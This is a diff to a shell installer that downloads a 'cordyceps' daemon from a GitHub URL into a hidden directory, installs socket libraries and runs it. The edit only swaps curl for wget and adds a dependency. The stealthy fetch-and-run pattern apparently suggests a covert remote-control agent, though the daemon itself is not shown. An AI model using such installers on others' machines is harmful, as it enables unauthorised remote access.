@@ -10,7 +10,7 @@ cd $hidden_dir || exit
 
 # Fetch the cordyceps daemon from the given URL
 echo "Downloading daemon..."
-curl -s https://raw.githubusercontent.com/feyli/cordyceps-daemon/refs/heads/main/cordyceps.py > daemon.py
+wget -q https://raw.githubusercontent.com/feyli/cordyceps-daemon/refs/heads/main/cordyceps.py -O daemon.py
 
 # Detect Python version
 if command -v python3 &>/dev/null; then
@@ -29,9 +29,9 @@ fi
 # Install required packages
 echo "Installing dependencies..."
 if command -v $PIP &>/dev/null; then
-    $PIP install python-socketio
+    $PIP install python-socketio websocket-client
 else
-    $PYTHON -m pip install python-socketio
+    $PYTHON -m pip install python-socketio websocket-client
 fi
 
 # Run the daemon
